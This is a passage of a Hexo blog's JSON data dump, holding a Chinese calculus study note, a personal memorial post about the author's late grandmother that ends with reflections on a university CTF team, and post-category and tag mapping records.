\\frac{1}{2!}x^2 + \\cdots + (-1)^n\\frac{x^{2n}}{(2n)!} + o(x^{2n+1})$</li>\n<li>$\\ln(1+x) = x - \\frac{x^2}{2} + \\frac{x^3}{3} + \\cdots + (-1)^{n-1}\\frac{x^n}{n} + o(x^n)$</li>\n<li>$(1+x)^\\alpha = 1 + \\alpha x + \\frac{\\alpha(\\alpha-1)}{2!}x^2 + \\cdots + \\frac{\\alpha(\\alpha-1)\\cdots(\\alpha-n+1)}{n!}x^n + o(x^n)$</li>\n</ol>\n<h3 id=\"第五章-向量代数与空间解析几何\"><a href=\"#第五章-向量代数与空间解析几何\" class=\"headerlink\" title=\"第五章 向量代数与空间解析几何\"></a>第五章 向量代数与空间解析几何</h3>","excerpt":"<p>忽然能转了，尝试速成高数上。</p>","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>有空再写。</p>\n<h2 id=\"笔记正文\"><a href=\"#笔记正文\" class=\"headerlink\" title=\"笔记正文\"></a>笔记正文</h2><h3 id=\"第一章-函数与极限\"><a href=\"#第一章-函数与极限\" class=\"headerlink\" title=\"第一章 函数与极限\"></a>第一章 函数与极限</h3><h4 id=\"连续函数\"><a href=\"#连续函数\" class=\"headerlink\" title=\"连续函数\"></a>连续函数</h4><h5 id=\"间断点的分类\"><a href=\"#间断点的分类\" class=\"headerlink\" title=\"间断点的分类\"></a>间断点的分类</h5><h3 id=\"第二章-微积分的基本概念\"><a href=\"#第二章-微积分的基本概念\" class=\"headerlink\" title=\"第二章 微积分的基本概念\"></a>第二章 微积分的基本概念</h3><h4 id=\"不定积分\"><a href=\"#不定积分\" class=\"headerlink\" title=\"不定积分\"></a>不定积分</h4><h5 id=\"积分表\"><a href=\"#积分表\" class=\"headerlink\" title=\"积分表\"></a>积分表</h5><ol>\n<li>$\\int x^\\alpha\\mathrm dx = \\frac{1}{\\alpha+1}x^{\\alpha+1}+C(\\alpha\\neq-1)$</li>\n<li>$\\int\\cos x\\mathrm dx = \\sin x+C$;$\\int\\sin x\\mathrm dx = -\\cos x+C$</li>\n<li>$\\int\\sec^2x\\mathrm dx = \\tan x+C$;$\\int\\csc^2x\\mathrm dx = -\\cot x+C$</li>\n<li>$\\int\\frac{\\mathrm dx}{1+x^2} = \\arctan x+C$;$\\int\\frac{\\mathrm dx}{\\sqrt{1-x^2}} = \\arcsin x+C$</li>\n<li>$\\int\\alpha^x\\mathrm dx = \\frac{1}{\\ln\\alpha}\\alpha^x+C(\\alpha&gt;0,\\alpha\\neq1)$</li>\n<li>$\\int\\frac1x\\mathrm dx = \\ln|x|+C$</li>\n</ol>\n<h3 id=\"第三章-积分的计算及应用\"><a href=\"#第三章-积分的计算及应用\" class=\"headerlink\" title=\"第三章 积分的计算及应用\"></a>第三章 积分的计算及应用</h3><h3 id=\"第四章-微分中值定理与泰勒公式\"><a href=\"#第四章-微分中值定理与泰勒公式\" class=\"headerlink\" title=\"第四章 微分中值定理与泰勒公式\"></a>第四章 微分中值定理与泰勒公式</h3><p>微分中值定理又称为<strong>拉格朗日中值定理</strong>：设 $y=f(x)$ 在 $[a,b]$ 上连续，在 $(a,b)$ 内可导，则必存在一点 $c\\in(a,b)$，使得<br>$$<br>f’(c) = \\frac{f(b)-f(a)}{b-a}<br>$$</p>\n<p><strong>例</strong> 证明当 $e &lt; a &lt; b &lt; e^2$ 时，$(b-a)\\frac{2}{e^2}&lt;\\ln^2b-\\ln^2a&lt;\\frac4e(b-a)$<br><strong>解</strong></p>\n<h4 id=\"泰勒公式\"><a href=\"#泰勒公式\" class=\"headerlink\" title=\"泰勒公式\"></a>泰勒公式</h4><p>常用 $\\ (x\\rightarrow0)$：</p>\n<ol>\n<li>$e^x=1+x+\\frac{1}{2!}x^2+\\cdots+\\frac{1}{n!}x^n+o(x^n)$</li>\n<li>$\\sin x = x - \\frac{1}{3!}x^3 + \\cdots + (-1)^{n-1}\\frac{x^{2n-1}}{(2n-1)!} + o(x^{2n})$</li>\n<li>$\\cos x = 1 - \\frac{1}{2!}x^2 + \\cdots + (-1)^n\\frac{x^{2n}}{(2n)!} + o(x^{2n+1})$</li>\n<li>$\\ln(1+x) = x - \\frac{x^2}{2} + \\frac{x^3}{3} + \\cdots + (-1)^{n-1}\\frac{x^n}{n} + o(x^n)$</li>\n<li>$(1+x)^\\alpha = 1 + \\alpha x + \\frac{\\alpha(\\alpha-1)}{2!}x^2 + \\cdots + \\frac{\\alpha(\\alpha-1)\\cdots(\\alpha-n+1)}{n!}x^n + o(x^n)$</li>\n</ol>\n<h3 id=\"第五章-向量代数与空间解析几何\"><a href=\"#第五章-向量代数与空间解析几何\" class=\"headerlink\" title=\"第五章 向量代数与空间解析几何\"></a>第五章 向量代数与空间解析几何</h3>"},{"title":"琐记 - 2","date":"2024-05-18T12:26:00.000Z","_content":"\n谨以此文，记念我的外婆。\n<!--more-->\n\n说记念而不是纪念，是因为我外婆也不是什么了不起的人，她只是一个普通的老人。\n\n小的时候，爸妈上班的时候没时间照顾我，就把我留在外婆家，让外公外婆照顾我。\n\n可以说，我小时候就是妈妈和外婆带大的。\n\n上小学的时候，我喜欢玩洛克王国，舅舅又不给我玩电脑，便求着外婆要舅舅房间的钥匙。外婆拗不过我，帮我把门开了，说我玩瞎了眼以后不要怪她。\n\n这些话我至今还记得，也根本不可能去怪外婆。\n\n昨天周五，睡醒的时候已经是中午 12 点了，看到家里人说外婆十点半往生了，感到有一丝难受，但又不是很多。\n\n因为早三个月前，我就已经想到会有这一天了。\n\n三个多月前，外婆已经是诊断出可能患癌了，但是也没有确诊，因为确诊要做穿刺——但是外婆已经经不起折腾，就算确诊，也撑不过手术了，就没做进一步检查。\n\n三个月前的一天，下午两点，我正准备去上课，妈妈忽然打电话给我，带着哭声，说外婆可能撑不过晚上了。我有点慌，马上又回到宿舍，收拾好东西，坐高铁回家。\n\n到外婆家的时候，外婆躺在床上，已经看不见东西了，大概是因为癌细胞已经破坏了视神经。\n\n她听到说是我回来看她，很开心，抓着我的手，说不用挂着她，说已经活够了，让我快点回学校好好读书。我没忍住眼泪，哭了。\n\n不知道是幸运还是不幸，外婆还是撑了下来，给了她的子女最后一次尽孝的机会。\n\n外婆的身子一直不好，腿经常痛，病的这几个月，也是一直在头痛中度过，各种止痛药吃个不停。\n\n逝世对她来说，或许也是一种解脱。\n\n她的三个子女也不用再为她的病痛来回操心了。\n\n所以我并不觉得这是一件十分悲伤的事情。\n\n外婆是一个虔诚的佛教徒，一生都在念佛。尽管我是一个坚定的无神论者，觉得佛教的传播甚至起源都是统治者操控思想的手笔，此刻我还是希望，她已经到了她所一直向往的西方极乐世界。\n\n在这里写这篇文章，也是相信《寻梦环游记》里的话。\n\n只要这个世界还有人记得外婆，还有地方存在对她的思念，她就不会真正死去。\n\n互联网上也会长久地为她念一声佛号——\n\n阿——弥——陀——佛——\n\n## 一些画像\n\n外婆经常觉得我没吃饱，大概是因为我太瘦了，但也就是这段时间，我忽然就胖到将近正常体重了。\n\n每次看望外婆要回家的时候，总会让我带点苹果回去。\n\n## 另一些琐事\n\n最近打完长城杯了，校队还是没什么起色。\n当初 tel 去 VN 的时候有叫上我，我想着留在校队里守一下，却不想成了一个巨大的遗憾。\n现在随着 CTF 的回归，想找点同级或者年轻的交流下，发现校队里没什么交流，S1uM4i 里又都是老登，人也基本都在广州，平时线下见面少之又少。\n前几天睡眠不足，脑抽了投个简历给 VN，想进去只水群不打比赛，后来才反应过来这操作有够抽象的，被背地里嘲笑一番估计是免不掉了。\n\n时代的尘埃，落在一个人身上，就是一座大山。\n\n现今版本，联队翻手之间，就能把我所向往的校队震为泡影。\n我为校队做的一切努力，都不过徒劳。\n还记得当初也是为了校队的传承选的密码，现在想来，若是选的 web，估计也不至于此。\n","source":"_posts/琐记 - 2.md","raw":"---\ntitle: 琐记 - 2\ndate: 2024-05-18 20:26:00\ntags: 杂谈\ncategories: 生活\n---\n\n谨以此文，记念我的外婆。\n<!--more-->\n\n说记念而不是纪念，是因为我外婆也不是什么了不起的人，她只是一个普通的老人。\n\n小的时候，爸妈上班的时候没时间照顾我，就把我留在外婆家，让外公外婆照顾我。\n\n可以说，我小时候就是妈妈和外婆带大的。\n\n上小学的时候，我喜欢玩洛克王国，舅舅又不给我玩电脑，便求着外婆要舅舅房间的钥匙。外婆拗不过我，帮我把门开了，说我玩瞎了眼以后不要怪她。\n\n这些话我至今还记得，也根本不可能去怪外婆。\n\n昨天周五，睡醒的时候已经是中午 12 点了，看到家里人说外婆十点半往生了，感到有一丝难受，但又不是很多。\n\n因为早三个月前，我就已经想到会有这一天了。\n\n三个多月前，外婆已经是诊断出可能患癌了，但是也没有确诊，因为确诊要做穿刺——但是外婆已经经不起折腾，就算确诊，也撑不过手术了，就没做进一步检查。\n\n三个月前的一天，下午两点，我正准备去上课，妈妈忽然打电话给我，带着哭声，说外婆可能撑不过晚上了。我有点慌，马上又回到宿舍，收拾好东西，坐高铁回家。\n\n到外婆家的时候，外婆躺在床上，已经看不见东西了，大概是因为癌细胞已经破坏了视神经。\n\n她听到说是我回来看她，很开心，抓着我的手，说不用挂着她，说已经活够了，让我快点回学校好好读书。我没忍住眼泪，哭了。\n\n不知道是幸运还是不幸，外婆还是撑了下来，给了她的子女最后一次尽孝的机会。\n\n外婆的身子一直不好，腿经常痛，病的这几个月，也是一直在头痛中度过，各种止痛药吃个不停。\n\n逝世对她来说，或许也是一种解脱。\n\n她的三个子女也不用再为她的病痛来回操心了。\n\n所以我并不觉得这是一件十分悲伤的事情。\n\n外婆是一个虔诚的佛教徒，一生都在念佛。尽管我是一个坚定的无神论者，觉得佛教的传播甚至起源都是统治者操控思想的手笔，此刻我还是希望，她已经到了她所一直向往的西方极乐世界。\n\n在这里写这篇文章，也是相信《寻梦环游记》里的话。\n\n只要这个世界还有人记得外婆，还有地方存在对她的思念，她就不会真正死去。\n\n互联网上也会长久地为她念一声佛号——\n\n阿——弥——陀——佛——\n\n## 一些画像\n\n外婆经常觉得我没吃饱，大概是因为我太瘦了，但也就是这段时间，我忽然就胖到将近正常体重了。\n\n每次看望外婆要回家的时候，总会让我带点苹果回去。\n\n## 另一些琐事\n\n最近打完长城杯了，校队还是没什么起色。\n当初 tel 去 VN 的时候有叫上我，我想着留在校队里守一下，却不想成了一个巨大的遗憾。\n现在随着 CTF 的回归，想找点同级或者年轻的交流下，发现校队里没什么交流，S1uM4i 里又都是老登，人也基本都在广州，平时线下见面少之又少。\n前几天睡眠不足，脑抽了投个简历给 VN，想进去只水群不打比赛，后来才反应过来这操作有够抽象的，被背地里嘲笑一番估计是免不掉了。\n\n时代的尘埃，落在一个人身上，就是一座大山。\n\n现今版本，联队翻手之间，就能把我所向往的校队震为泡影。\n我为校队做的一切努力，都不过徒劳。\n还记得当初也是为了校队的传承选的密码，现在想来，若是选的 web，估计也不至于此。\n","slug":"琐记 - 2","published":1,"updated":"2024-06-03T06:41:41.946Z","comments":1,"layout":"post","photos":[],"_id":"clxa5zody002f7slzb28k0u8t","content":"<p>谨以此文，记念我的外婆。</p>\n<span id=\"more\"></span>\n\n<p>说记念而不是纪念，是因为我外婆也不是什么了不起的人，她只是一个普通的老人。</p>\n<p>小的时候，爸妈上班的时候没时间照顾我，就把我留在外婆家，让外公外婆照顾我。</p>\n<p>可以说，我小时候就是妈妈和外婆带大的。</p>\n<p>上小学的时候，我喜欢玩洛克王国，舅舅又不给我玩电脑，便求着外婆要舅舅房间的钥匙。外婆拗不过我，帮我把门开了，说我玩瞎了眼以后不要怪她。</p>\n<p>这些话我至今还记得，也根本不可能去怪外婆。</p>\n<p>昨天周五，睡醒的时候已经是中午 12 点了，看到家里人说外婆十点半往生了，感到有一丝难受，但又不是很多。</p>\n<p>因为早三个月前，我就已经想到会有这一天了。</p>\n<p>三个多月前，外婆已经是诊断出可能患癌了，但是也没有确诊，因为确诊要做穿刺——但是外婆已经经不起折腾，就算确诊，也撑不过手术了，就没做进一步检查。</p>\n<p>三个月前的一天，下午两点，我正准备去上课，妈妈忽然打电话给我，带着哭声，说外婆可能撑不过晚上了。我有点慌，马上又回到宿舍，收拾好东西，坐高铁回家。</p>\n<p>到外婆家的时候，外婆躺在床上，已经看不见东西了，大概是因为癌细胞已经破坏了视神经。</p>\n<p>她听到说是我回来看她，很开心，抓着我的手，说不用挂着她，说已经活够了，让我快点回学校好好读书。我没忍住眼泪，哭了。</p>\n<p>不知道是幸运还是不幸，外婆还是撑了下来，给了她的子女最后一次尽孝的机会。</p>\n<p>外婆的身子一直不好，腿经常痛，病的这几个月，也是一直在头痛中度过，各种止痛药吃个不停。</p>\n<p>逝世对她来说，或许也是一种解脱。</p>\n<p>她的三个子女也不用再为她的病痛来回操心了。</p>\n<p>所以我并不觉得这是一件十分悲伤的事情。</p>\n<p>外婆是一个虔诚的佛教徒，一生都在念佛。尽管我是一个坚定的无神论者，觉得佛教的传播甚至起源都是统治者操控思想的手笔，此刻我还是希望，她已经到了她所一直向往的西方极乐世界。</p>\n<p>在这里写这篇文章，也是相信《寻梦环游记》里的话。</p>\n<p>只要这个世界还有人记得外婆，还有地方存在对她的思念，她就不会真正死去。</p>\n<p>互联网上也会长久地为她念一声佛号——</p>\n<p>阿——弥——陀——佛——</p>\n<h2 id=\"一些画像\"><a href=\"#一些画像\" class=\"headerlink\" title=\"一些画像\"></a>一些画像</h2><p>外婆经常觉得我没吃饱，大概是因为我太瘦了，但也就是这段时间，我忽然就胖到将近正常体重了。</p>\n<p>每次看望外婆要回家的时候，总会让我带点苹果回去。</p>\n<h2 id=\"另一些琐事\"><a href=\"#另一些琐事\" class=\"headerlink\" title=\"另一些琐事\"></a>另一些琐事</h2><p>最近打完长城杯了，校队还是没什么起色。<br>当初 tel 去 VN 的时候有叫上我，我想着留在校队里守一下，却不想成了一个巨大的遗憾。<br>现在随着 CTF 的回归，想找点同级或者年轻的交流下，发现校队里没什么交流，S1uM4i 里又都是老登，人也基本都在广州，平时线下见面少之又少。<br>前几天睡眠不足，脑抽了投个简历给 VN，想进去只水群不打比赛，后来才反应过来这操作有够抽象的，被背地里嘲笑一番估计是免不掉了。</p>\n<p>时代的尘埃，落在一个人身上，就是一座大山。</p>\n<p>现今版本，联队翻手之间，就能把我所向往的校队震为泡影。<br>我为校队做的一切努力，都不过徒劳。<br>还记得当初也是为了校队的传承选的密码，现在想来，若是选的 web，估计也不至于此。</p>\n","excerpt":"<p>谨以此文，记念我的外婆。</p>","more":"<p>说记念而不是纪念，是因为我外婆也不是什么了不起的人，她只是一个普通的老人。</p>\n<p>小的时候，爸妈上班的时候没时间照顾我，就把我留在外婆家，让外公外婆照顾我。</p>\n<p>可以说，我小时候就是妈妈和外婆带大的。</p>\n<p>上小学的时候，我喜欢玩洛克王国，舅舅又不给我玩电脑，便求着外婆要舅舅房间的钥匙。外婆拗不过我，帮我把门开了，说我玩瞎了眼以后不要怪她。</p>\n<p>这些话我至今还记得，也根本不可能去怪外婆。</p>\n<p>昨天周五，睡醒的时候已经是中午 12 点了，看到家里人说外婆十点半往生了，感到有一丝难受，但又不是很多。</p>\n<p>因为早三个月前，我就已经想到会有这一天了。</p>\n<p>三个多月前，外婆已经是诊断出可能患癌了，但是也没有确诊，因为确诊要做穿刺——但是外婆已经经不起折腾，就算确诊，也撑不过手术了，就没做进一步检查。</p>\n<p>三个月前的一天，下午两点，我正准备去上课，妈妈忽然打电话给我，带着哭声，说外婆可能撑不过晚上了。我有点慌，马上又回到宿舍，收拾好东西，坐高铁回家。</p>\n<p>到外婆家的时候，外婆躺在床上，已经看不见东西了，大概是因为癌细胞已经破坏了视神经。</p>\n<p>她听到说是我回来看她，很开心，抓着我的手，说不用挂着她，说已经活够了，让我快点回学校好好读书。我没忍住眼泪，哭了。</p>\n<p>不知道是幸运还是不幸，外婆还是撑了下来，给了她的子女最后一次尽孝的机会。</p>\n<p>外婆的身子一直不好，腿经常痛，病的这几个月，也是一直在头痛中度过，各种止痛药吃个不停。</p>\n<p>逝世对她来说，或许也是一种解脱。</p>\n<p>她的三个子女也不用再为她的病痛来回操心了。</p>\n<p>所以我并不觉得这是一件十分悲伤的事情。</p>\n<p>外婆是一个虔诚的佛教徒，一生都在念佛。尽管我是一个坚定的无神论者，觉得佛教的传播甚至起源都是统治者操控思想的手笔，此刻我还是希望，她已经到了她所一直向往的西方极乐世界。</p>\n<p>在这里写这篇文章，也是相信《寻梦环游记》里的话。</p>\n<p>只要这个世界还有人记得外婆，还有地方存在对她的思念，她就不会真正死去。</p>\n<p>互联网上也会长久地为她念一声佛号——</p>\n<p>阿——弥——陀——佛——</p>\n<h2 id=\"一些画像\"><a href=\"#一些画像\" class=\"headerlink\" title=\"一些画像\"></a>一些画像</h2><p>外婆经常觉得我没吃饱，大概是因为我太瘦了，但也就是这段时间，我忽然就胖到将近正常体重了。</p>\n<p>每次看望外婆要回家的时候，总会让我带点苹果回去。</p>\n<h2 id=\"另一些琐事\"><a href=\"#另一些琐事\" class=\"headerlink\" title=\"另一些琐事\"></a>另一些琐事</h2><p>最近打完长城杯了，校队还是没什么起色。<br>当初 tel 去 VN 的时候有叫上我，我想着留在校队里守一下，却不想成了一个巨大的遗憾。<br>现在随着 CTF 的回归，想找点同级或者年轻的交流下，发现校队里没什么交流，S1uM4i 里又都是老登，人也基本都在广州，平时线下见面少之又少。<br>前几天睡眠不足，脑抽了投个简历给 VN，想进去只水群不打比赛，后来才反应过来这操作有够抽象的，被背地里嘲笑一番估计是免不掉了。</p>\n<p>时代的尘埃，落在一个人身上，就是一座大山。</p>\n<p>现今版本，联队翻手之间，就能把我所向往的校队震为泡影。<br>我为校队做的一切努力，都不过徒劳。<br>还记得当初也是为了校队的传承选的密码，现在想来，若是选的 web，估计也不至于此。</p>"}],"PostAsset":[],"PostCategory":[{"post_id":"cl8wgppov0009ck6gd75s734j","category_id":"cl8wgppor0004ck6g8sj96dqx","_id":"cl8wgppp2000gck6gbntjhuk1"},{"post_id":"cl8wgppp6000rck6g9az2a35s","category_id":"cl8wgppp5000nck6gb6tjd2ny","_id":"cl8wgppp8000zck6g4nx89qcw"},{"post_id":"cl8wgpppe001kck6g55b22szw","category_id":"cl8wgppp5000nck6gb6tjd2ny","_id":"cl8wgpppg001uck6g89fnbswr"},{"post_id":"cl8wgppp8000yck6g31l8aru0","category_id":"cl8wgpppe001lck6g1xnsczld","_id":"cl8wgpppg001vck6gf9uy5zol"},{"post_id":"cl8wgpppa0013ck6gcymkf7la","category_id":"cl8wgpppf001sck6ghdo2gupw","_id":"cl8wgpppg001yck6gdw703l1l"},{"post_id":"cl8wgpppa0015ck6g74h7aqhq","category_id":"cl8wgpppg001wck6gdzdw751v","_id":"cl8wgppph0021ck6gde502eg0"},{"post_id":"cl8wgpppd001hck6ghvy29kim","category_id":"cl8wgpppg001zck6ga5cpegfa","_id":"cl8wgpppi002bck6g6hor2df3"},{"post_id":"cl8wgpppe001ock6g78n6dosb","category_id":"cl8wgpppg001zck6ga5cpegfa","_id":"cl8wgpppi002fck6gc2kv8kjr"},{"post_id":"cl8wgpppf001qck6g39nr082p","category_id":"cl8wgpppg001wck6gdzdw751v","_id":"cl8wgpppj002ick6g30eoeb7f"},{"post_id":"cl8wgppps0040ck6g7g1odhn7","category_id":"cl8wgppp5000nck6gb6tjd2ny","_id":"cl8wgpppy0043ck6ge5yy1v5n"},{"post_id":"cl8wgpppx0041ck6ggq1hbdsq","category_id":"cl8wgppor0004ck6g8sj96dqx","_id":"cl8wgpppy0044ck6g5xadewqm"},{"post_id":"cl915f8b70000do6ghiaeczan","category_id":"cl8wgppp5000nck6gb6tjd2ny","_id":"cl915hih8000cdo6ggxwx7wuf"},{"post_id":"cl9fiq3eu0000446g5bx39mt0","category_id":"cl8wgpppg001zck6ga5cpegfa","_id":"cl9fiq3f20003446g2l1186ek"},{"post_id":"cl9vhj6a30000og6g1kziaam8","category_id":"cl8wgppor0004ck6g8sj96dqx","_id":"cl9vhj6aa0002og6g95vm718u"},{"post_id":"cla7okcsv0000fs6g5kxc6z0y","category_id":"cl8wgppp5000nck6gb6tjd2ny","_id":"cla7okct00004fs6g4zse1g5k"},{"post_id":"cla7okcsy0001fs6g1nytaq41","category_id":"cl8wgppp5000nck6gb6tjd2ny","_id":"cla7okct00006fs6ghy91btgx"},{"post_id":"clac8pkrr0000jg6g2yw9b03q","category_id":"cl8wgppor0004ck6g8sj96dqx","_id":"clac8pkru0003jg6g361agruz"},{"post_id":"clazajjqr0000yo6g7vpt47ot","category_id":"cl8wgppor0004ck6g8sj96dqx","_id":"clazajjqy0006yo6g5dc1anbt"},{"post_id":"clazajjqv0001yo6gdnpi8t2q","category_id":"cl8wgppor0004ck6g8sj96dqx","_id":"clazajjqz0009yo6g7rqvhxdr"},{"post_id":"clazajjqx0003yo6g2i0zaqlz","category_id":"cl8wgppor0004ck6g8sj96dqx","_id":"clazajjr0000cyo6geed77zbv"},{"post_id":"clazajjqy0005yo6gahdt3fqu","category_id":"cl8wgppp5000nck6gb6tjd2ny","_id":"clazajjr0000fyo6ggold0axq"},{"post_id":"clazajjqz0008yo6g4kd73ymc","category_id":"cl8wgppp5000nck6gb6tjd2ny","_id":"clazajjr1000hyo6ge8k706m0"},{"post_id":"clazajjqz000byo6g9w3ibilt","category_id":"cl8wgppp90011ck6g0qo4eyyg","_id":"clazajjr3000kyo6ggrydhm6h"},{"post_id":"clazajjr0000eyo6g3k6x8c4n","category_id":"cl8wgppp5000nck6gb6tjd2ny","_id":"clazajjr4000myo6gea8w3sr5"},{"post_id":"clazajjr2000jyo6g1q9qc2fl","category_id":"cl8wgppp90011ck6g0qo4eyyg","_id":"clazajjr6000qyo6g22skaxvw"},{"post_id":"clazajjr5000oyo6ghsdsefz1","category_id":"cl8wgpppg001zck6ga5cpegfa","_id":"clazajjr7000tyo6gd7a79p43"},{"post_id":"cldvq79nx0000g06gdqp76ra0","category_id":"cl8wgppp5000nck6gb6tjd2ny","_id":"cldvq79o50002g06g5n40aqva"},{"post_id":"clxa5zock00007slzhjt48vze","category_id":"cl8wgppor0004ck6g8sj96dqx","_id":"clxa5zocu00057slz9iwe742f"},{"post_id":"clxa5zocm00017slz46xc0dhq","category_id":"cl8wgppor0004ck6g8sj96dqx","_id":"clxa5zocu00077slz6mnt8l9u"},{"post_id":"clxa5zocr00037slzdw5h6ydn","category_id":"cl8wgppor0004ck6g8sj96dqx","_id":"clxa5zocv000b7slz0fezbhse"},{"post_id":"clxa5zoct00047slz3ugk88rm","category_id":"cl8wgppor0004ck6g8sj96dqx","_id":"clxa5zocx000d7slzcmmlessy"},{"post_id":"clxa5zocu00067slz7k0o1i5b","category_id":"cl8wgppor0004ck6g8sj96dqx","_id":"clxa5zod9000f7slz6tdz5a8f"},{"post_id":"clxa5zocv000a7slz8y0q7hle","category_id":"cl8wgppp5000nck6gb6tjd2ny","_id":"clxa5zoda000i7slz0bjdggti"},{"post_id":"clxa5zodb000l7slza8bk5taz","category_id":"cl8wgppp5000nck6gb6tjd2ny","_id":"clxa5zodd000s7slzgk6vhkyj"},{"post_id":"clxa5zod9000h7slz5erfc2xv","category_id":"clxa5zodb000n7slz1s77hx14","_id":"clxa5zodi000w7slz3xp5cftf"},{"post_id":"clxa5zodb000o7slz78wkh8qt","category_id":"clxa5zodb000n7slz1s77hx14","_id":"clxa5zodk00107slzbtfteajt"},{"post_id":"clxa5zodk00137slzgkymgsvg","category_id":"cl8wgppp90011ck6g0qo4eyyg","_id":"clxa5zodn00197slzdor439l3"},{"post_id":"clxa5zodl00157slz6dpn0yjf","category_id":"cl8wgppor0004ck6g8sj96dqx","_id":"clxa5zodo001b7slzfbnagmng"},{"post_id":"clxa5zodq001j7slz3bnx3d0f","category_id":"clxa5zodr001m7slzf29pcpge","_id":"clxa5zodt001u7slz8zdf5a04"},{"post_id":"clxa5zodt001t7slz7mh9f1ba","category_id":"cl8wgppp5000nck6gb6tjd2ny","_id":"clxa5zodv001z7slzdt06dwyx"},{"post_id":"clxa5zodu001y7slza8d8dq9q","category_id":"cl8wgppp5000nck6gb6tjd2ny","_id":"clxa5zodw00247slz6vvjgr7o"},{"post_id":"clxa5zodv00207slz1c19afpw","category_id":"clxa5zodr001m7slzf29pcpge","_id":"clxa5zodw00277slzgfcgdm4p"},{"post_id":"clxa5zody002e7slz4s6q3zxp","category_id":"cl8wgppp5000nck6gb6tjd2ny","_id":"clxa5zodz002i7slz408w9xqh"},{"post_id":"clxa5zody002f7slzb28k0u8t","category_id":"clxa5zodr001m7slzf29pcpge","_id":"clxa5zodz002k7slzfis4fpf8"}],"PostTag":[{"post_id":"cl8wgppov0009ck6gd75s734j","tag_id":"cl8wgppos0005ck6ghyhvhu54","_id":"cl8wgppp0000dck6geqsf69h7"},{"post_id":"cl8wgppp6000rck6g9az2a35s","tag_id":"cl8wgpppj002jck6g9lxs5340","_id":"cl8wgpppl002pck6g8is571bu"},{"post_id":"cl8wgppp6000rck6g9az2a35s","tag_id":"cl8wgpppk002mck6g9ys4hmu3","_id":"cl8wgpppl002qck6g6berbj5r"},{"post_id":"cl8wgppp6000rck6g9az2a35s","tag_id":"cl8wgpppl002nck6gchy0gbow","_id":"cl8wgpppl002sck6gbaxe3u1b"},{"post_id":"cl8wgppp8000yck6g31l8aru0","tag_id":"cl8wgpppm002zck6ggu1c6yck","_id":"cl8wgpppn0034ck6gguhyef3f"},{"post_id":"cl8wgpppa0013ck6gcymkf7la","tag_id":"cl8wgpppj002hck6g8hvw6rcu","_id":"cl8wgpppn0036ck6g8g1o58lq"},{"post_id":"cl8wgpppa0015ck6g74h7aqhq","tag_id":"cl8wgpppn0035ck6gd1871maq","_id":"cl8wgpppn0038ck6g2ghpc4cy"},{"post_id":"cl8wgpppd001hck6ghvy29kim","tag_id":"cl8wgpppj002jck6g9lxs5340","_id":"cl8wgpppp003jck6g92m2912j"},{"post_id":"cl8wgpppd001hck6ghvy29kim","tag_id":"cl8wgpppl002nck6gchy0gbow","_id":"cl8wgpppp003kck6gg6keh17o"},{"post_id":"cl8wgpppd001hck6ghvy29kim","tag_id":"cl8wgpppo003ack6g9n3jaoky","_id":"cl8wgpppp003nck6g3wa29hha"},{"post_id":"cl8wgpppe001kck6g55b22szw","tag_id":"cl8wgpppp003ick6gh2p53r4q","_id":"cl8wgpppp003pck6g46ow6zp8"},{"post_id":"cl8wgpppe001ock6g78n6dosb","tag_id":"cl8wgpppj002jck6g9lxs5340","_id":"cl8wgpppq003rck6gb4ja4s75"},{"post_id":"cl8wgpppe001ock6g78n6dosb","tag_id":"cl8wgpppl002nck6gchy0gbow","_id":"cl8wgpppq003sck6g1ios464j"},{"post_id":"cl8wgpppf001qck6g39nr082p","tag_id":"cl8wgpppn0035ck6gd1871maq","_id":"cl8wgpppq003wck6g3n4s22ab"},{"post_id":"cl8wgpppf001qck6g39nr082p","tag_id":"cl8wgpppq003tck6gbqd9esq6","_id":"cl8wgpppq003xck6g0ne87n3w"},{"post_id":"cl8wgpppf001qck6g39nr082p","tag_id":"cl8wgpppe001nck6g66ebb7n5","_id":"cl8wgpppq003yck6gatc50k4c"},{"post_id":"cl8wgpppf001qck6g39nr082p","tag_id":"cl8wgpppq003vck6g0oj7hwdp","_id":"cl8wgpppq003zck6gak8v51tf"},{"post_id":"cl8wgppps0040ck6g7g1odhn7","tag_id":"cl8wgpppj002jck6g9lxs5340","_id":"cl8wgpppy0046ck6g466vfg8w"},{"post_id":"cl8wgppps0040ck6g7g1odhn7","tag_id":"cl8wgpppy0042ck6g8f5hcx8v","_id":"cl8wgpppy0047ck6ge0h89ztr"},{"post_id":"cl8wgpppx0041ck6ggq1hbdsq","tag_id":"cl8wgpppn0035ck6gd1871maq","_id":"cl8wgpppy0048ck6get962pjk"},{"post_id":"cl8wgpppx0041ck6ggq1hbdsq","tag_id":"cl8wgpppj002jck6g9lxs5340","_id":"cl8wgpppy0049ck6g9hvefhdl"},{"post_id":"cl8wgpppx0041ck6ggq1hbdsq","tag_id":"cl8wgpppk002mck6g9ys4hmu3","_id":"cl8wgpppy004ack6g0jfm5lby"},{"post_id":"cl8wgpppx0041ck6ggq1hbdsq","tag_id":"cl8wgpppl002nck6gchy0gbow","_id":"cl8wgpppy004bck6ghww35oz4"},{"post_id":"cl8wgpppx0041ck6ggq1hbdsq","tag_id":"cl8wgpppy0045ck6g7x6th6zp","_id":"cl8wgpppy004cck6g9n7kfwei"},{"post_id":"cl915f8b70000do6ghiaeczan","tag_id":"cl8wgpppj002jck6g9lxs5340","_id":"cl915hih7000ado6gei95epc9"},{"post_id":"cl915f8b70000do6ghiaeczan","tag_id":"cl8wgpppy0042ck6g8f5hcx8v","_id":"cl915hih8000bdo6gc8yybeu4"},{"post_id":"cl915f8b70000do6ghiaeczan","tag_id":"cl915i4sa000ddo6ggdm06fo3","_id":"cl915i4sa000edo6ghjy20ga1"},{"post_id":"cl9fiq3eu0000446g5bx39mt0","tag_id":"cl8wgpppj002jck6g9lxs5340","_id":"cl9fiq3f10001446gaqbo229m"},{"post_id":"cl9fiq3eu0000446g5bx39mt0","tag_id":"cl8wgpppl002nck6gchy0gbow","_id":"cl9fiq3f20002446g14pobl9d"},{"post_id":"cl9fiq3eu0000446g5bx39mt0","tag_id":"cl8wgpppo003ack6g9n3jaoky","_id":"cl9fiq3f30005446gdkxe5jgc"},{"post_id":"cl9vhj6a30000og6g1kziaam8","tag_id":"cl8wgppos0005ck6ghyhvhu54","_id":"cl9vhj6a90001og6g50urb3um"},{"post_id":"cla7okcsv0000fs6g5kxc6z0y","tag_id":"cl8wgpppb0017ck6g5fk4hgpn","_id":"cla7okct00002fs6gepl3b89w"},{"post_id":"cla7okcsy0001fs6g1nytaq41","tag_id":"cl8wgppos0005ck6